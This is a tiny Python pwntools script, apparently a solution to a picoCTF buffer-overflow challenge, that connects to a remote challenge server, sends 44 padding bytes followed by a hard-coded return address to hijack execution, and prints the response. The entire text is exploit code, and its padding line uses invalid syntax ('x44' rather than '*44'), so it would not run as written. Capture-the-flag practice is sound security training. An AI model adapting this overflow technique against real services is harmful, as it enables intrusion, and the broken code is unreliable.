from pwn import *


p = remote("saturn.picoctf.net", 57049)
print(p.recv() )
p.sendline(b"A"x44+b"\xf6\x91\x04\x06")
print( p.recvall() )

